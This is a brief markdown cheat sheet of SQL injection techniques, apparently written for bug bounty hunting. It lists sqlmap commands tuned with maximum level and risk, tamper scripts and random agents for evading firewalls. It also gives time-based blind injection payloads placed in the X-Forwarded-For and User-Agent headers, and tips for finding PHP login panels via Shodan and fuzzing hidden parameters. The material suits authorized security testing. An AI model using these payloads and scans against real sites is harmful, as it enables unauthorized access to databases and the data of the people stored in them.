# sqlpayload

* sqlmap.py -u “<URL>” --batch --banner

* On login / php website try sqli payloads 

* Use shodan for IP based login panels - try sqli

* always try sql injcetion on php site .php ending url guess hidden param with Arjun and try to perform there

* mostly try on hidden param finded with Arjun so try to guess more hidden param as possible throw fuzzing etc

# Bug : Blind SQL Injection
Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

# waf bypass sqlmap

* sqlmap -u “url” -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind"  --current-user --hostname

# sql injcetion tip

Application was using php ( whenever I see php , I test sqli first ) 
I tried blind sqli payload in login params  - not worked
sprayed in user-agent - worked✅

User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
===> 5.xx seconds delay


# sql injection tip

u can hunt post based param when if the URL has POST /hello/string/testing.php HTTP/1.1
 
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://█████████ --data="████████&██████" -p username --dbms=mysql 
  
